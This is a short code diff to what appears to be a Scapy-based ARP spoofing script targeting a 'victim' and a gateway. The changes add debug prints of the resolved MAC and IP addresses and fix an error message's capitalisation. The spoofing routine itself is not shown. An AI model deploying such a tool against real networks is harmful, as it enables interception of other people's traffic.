@@ -13,6 +13,7 @@ import sys
 def getMAC(ip):
     ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=5, retry=3, verbose=False)
 
+    print("ans:", ans)
     if ans:
         return ans[0][1].src
 
@@ -30,8 +31,14 @@ def main(gatewayIP, victimIP):
     victimMAC = getMAC(victimIP)
     gatewayMAC = getMAC(gatewayIP)
 
+    print("victimMAC:",victimMAC)
+    print("victimIP:", victimIP)
+
+    print("gatewayMAC:", gatewayMAC)
+    print("gatewayIP:", gatewayIP)
+
     if victimMAC == None or gatewayMAC == None:
-        print("cannot find MAC address")
+        print("Cannot find MAC address")
         exit()
 
     print(f'Start Spoofing -> VICTIM IP {victimIP}')
